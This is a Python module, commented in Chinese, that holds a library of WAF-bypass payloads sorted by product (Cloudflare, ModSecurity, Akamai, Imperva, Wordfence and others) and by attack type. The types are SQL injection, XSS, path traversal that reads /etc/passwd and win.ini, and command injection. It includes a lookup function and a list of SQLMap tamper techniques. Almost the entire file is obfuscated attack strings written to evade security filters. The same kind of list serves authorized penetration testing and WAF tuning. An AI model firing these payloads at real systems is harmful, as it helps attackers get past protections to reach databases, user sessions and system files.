"""WAF 绕过 Payload 库

按 WAF 类型和漏洞类型分类的绕过 payload。
参考 SQLMap tamper scripts 和社区 WAF 绕过经验。
"""
from typing import Dict, List

# 绕过 payload 库
BYPASS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    # ========== Cloudflare 绕过 ==========
    "cloudflare": {
        "sqli": [
            # 大小写混淆
            "uNion SeLeCT 1,2,3--",
            "UniOn SelEct 1,2,3,4,5--",
            # 注释混淆
            "union/**/select/**/1,2,3--",
            "union/*!50001select*/1,2,3--",
            # 混合
            "UniOn/**/SeLeCt/**/1,2,3--",
            # 空格替换
            "union\t select 1,2,3--",
            "union\x0bselect 1,2,3--",
            # URL 编码
            "union%20select%201,2,3--",
            "union%0aselect%0a1,2,3--",
            # 双重 URL 编码
            "union%2520select%25201,2,3--",
        ],
        "xss": [
            # 大小写混淆
            "<ScRiPt>alert(1)</sCrIpT>",
            "<IMG SRC=j&#97;vascript:alert(1)>",
            # 事件处理混淆
            "<svg onload=alert(1)>",
            "<IMG SRC=\"x\" ONERROR=\"alert(1)\">",
            # 注释混淆
            "<scr\x00ipt>alert(1)</scr\x00ipt>",
            "<scr/**/ipt>alert(1)</scr/**/ipt>",
            # Unicode 编码
            "<\u0073\u0063\u0072\u0069\u0070\u0074>alert(1)</script>",
            # 混合
            "<ScRiPt>al\u0065rt(1)</sCrIpT>",
        ],
        "lfi": [
            # 路径混淆
            "....//....//....//etc/passwd",
            "....\\/....\\/....\\/etc/passwd",
            "..%252f..%252f..%252fetc/passwd",
            "..%c0%af..%c0%af..%c0%afetc/passwd",
            # 编码绕过
            "/etc/passwd%00",
            "/etc/passwd%00.jpg",
            # 注释混淆
            "/etc/*/passwd",
            "/etc/***/passwd",
        ],
        "cmdi": [
            # 管道符混淆
            "cat /etc/passwd|ls",
            "cat /etc/passwd%0als",
            # 命令混淆
            "cat${IFS}/etc/passwd",
            "cat\x09/etc/passwd",
            # 编码
            "cat /etc/passwd%0a",
            # 组合
            "cat%09/etc/passwd|ls%0a",
        ]
    },

    # ========== ModSecurity 绕过 ==========
    "modsecurity": {
        "sqli": [
            # 注释混淆 (最重要)
            "union/*!50001select*/1,2,3--",
            "union/*!50000select*/1,2,3--",
            "union/*!12345select*/1,2,3--",
            # 内联注释绕过版本检测
            "/*!50001union*/ /*!50001select*/1,2,3--",
            # 双重编码
            "union%2500select%25001,2,3--",
            "union%2520select%25201,2,3--",
            # 空格替换
            "union%09select%091,2,3--",
            "union%0bselect%0b1,2,3--",
            "union%0cselect%0c1,2,3--",
            "union%a0select%a01,2,3--",
            # 浮点数
            "union select 1,2,3 from users where id=1.0",
            # 括号
            "union(select(1),2,3)",
        ],
        "xss": [
            # 事件处理器混淆
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            # 标签混淆
            "<script /onload=alert(1)>",
            # Unicode
            "<script>al\\u0065rt(1)</script>",
            # 编码
            "<script>alert(String.fromCharCode(49))</script>",
        ],
        "lfi": [
            # 双重编码
            "..%252f..%252f..%252fetc/passwd",
            "..%255c..%255c..%255cwindows\\win.ini",
            # Null byte
            "../../etc/passwd%00.jpg",
            # 路径混淆
            "....//....//etc/passwd",
        ],
        "cmdi": [
            # 换行符
            "cat /etc/passwd%0a id",
            # 制表符
            "cat\x09/etc/passwd",
            # $() 替代
            "$(cat /etc/passwd)",
            # 反引号
            "`cat /etc/passwd`",
        ]
    },

    # ========== AWS WAF 绕过 ==========
    "aws_waf": {
        "sqli": [
            # JSON body
            '{"id": "1 OR 1=1"}',
            # 分块传输
            # (需要手动设置 Transfer-Encoding: chunked)
            # 组合拳
            "union%20select%201,2,3--",
        ],
        "xss": [
            "<svg onload=alert(1)>",
            # 编码
            "<script>alert(/xss/)</script>",
        ],
        "lfi": [
            "/etc/passwd",
            "../../../etc/passwd",
        ],
        "cmdi": [
            "id",
            "ls",
        ]
    },

    # ========== Akamai 绕过 ==========
    "akamai": {
        "sqli": [
            # 大小写
            "UniOn SeLeCt 1,2,3--",
            # Unicode 混淆
            "un\u0069on sel\u0065ct 1,2,3--",
            # 注释
            "union/**/select/**/1,2,3--",
        ],
        "xss": [
            # Unicode
            "<\u0073\u0063\u0072\u0069\u0070\u0074>alert(1)</script>",
            # 混合
            "<ScRiPt>alert(1)</sCrIpT>",
        ],
        "lfi": [
            "..%252f..%252f..%252fetc/passwd",
            "....//....//....//etc/passwd",
        ],
        "cmdi": [
            "cat${IFS}/etc/passwd",
            "cat%09/etc/passwd",
        ]
    },

    # ========== Incapsula/Imperva 绕过 ==========
    "incapsula": {
        "sqli": [
            # HTTP 参数污染 (HPP)
            "id=1&id=2 OR 1=1--",
            "id=1/**/OR/**/1=1--",
            # 分割 payload
            "id=1' UNI",
            "ON SEL",
            "ECT 1,2,3--",
            # 注释
            "union/*a*/select/*b*/1,2,3--",
        ],
        "xss": [
            # 事件处理器
            "<img src=x onerror=alert(1)>",
            # 绕过关键字检测
            "<scr\x00ipt>",
            # 多重编码
        ],
        "lfi": [
            "../../etc/passwd",
            "..%2f..%2f..%2fetc/passwd",
        ],
        "cmdi": [
            "id",
            "ls",
        ]
    },

    # ========== Wordfence 绕过 ==========
    "wordfence": {
        "sqli": [
            # 时间延迟
            "1' AND SLEEP(5)--",
            "1' AND (SELECT SLEEP(5))--",
            # 注释混淆
            "1'/**/AND/**/1=1--",
            # 分割
            "1' UN",
            "ION SEL",
            "ECT 1--",
        ],
        "xss": [
            # 时间延迟触发
            "<script>setTimeout(alert(1),1000)</script>",
            # 编码
        ],
        "lfi": [
            "/etc/passwd",
        ],
        "cmdi": [
            # Ping 延迟
            "ping -c 5 127.0.0.1",
        ]
    },

    # ========== 默认绕过 (通用) ==========
    "default": {
        "sqli": [
            # 标准混淆
            "1' OR '1'='1",
            "1' OR 1=1--",
            "admin'--",
            "admin' #",
            # Union
            " UNION SELECT 1,2,3--",
            " UNION ALL SELECT 1,2,3,4,5--",
            # 盲注
            "1' AND 1=1--",
            "1' AND 1=2--",
            # 报错注入
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            # 注释
            "1'/*comment*/OR/*comment*/1=1--",
        ],
        "xss": [
            # 基础
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(1)>",
            # 事件
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            # 其他标签
            "<iframe src=javascript:alert(1)>",
            "<object data=javascript:alert(1)>",
            "<embed src=javascript:alert(1)>",
        ],
        "lfi": [
            # 基础
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "/etc/passwd",
            "c:\\windows\\win.ini",
            # 常用路径
            "../../../../../../etc/passwd",
            "....//....//....//etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
        ],
        "cmdi": [
            # Linux
            "id",
            "cat /etc/passwd",
            "ls -la",
            "whoami",
            "uname -a",
            # Windows
            "dir",
            "type c:\\windows\\win.ini",
            "ipconfig",
            "whoami /all",
        ]
    }
}


def get_bypass_payloads(waf_type: str = "default", vuln_type: str = "sqli") -> List[str]:
    """获取绕过 payload"""
    if waf_type in BYPASS_PAYLOADS:
        if vuln_type in BYPASS_PAYLOADS[waf_type]:
            return BYPASS_PAYLOADS[waf_type][vuln_type]

    return BYPASS_PAYLOADS.get("default", {}).get(vuln_type, [])


# SQLMap 风格tamper脚本参考
TAMPER_SCRIPTS = {
    "space2comment": "空格替换为注释",
    "space2hash": "空格替换为 #%0a",
    "space2mysqlblank": "空格替换为 MySQL 空白字符",
    "space2mysqldash": "空格替换为 --%0a",
    "space2plus": "空格替换为 +",
    "charencode": "URL 编码",
    "charunicodeencode": "Unicode 编码",
    "between": "BETWEEN 替换 AND",
    "percentage": "添加 % 前缀",
    "ifnull2ifisnull": "IFNULL 替换为 IF IS NULL",
}


if __name__ == "__main__":
    # 测试
    payloads = get_bypass_payloads("cloudflare", "sqli")
    print(f"Cloudflare SQLi bypasses: {len(payloads)}")
    for p in payloads[:5]:
        print(f"  {p}")
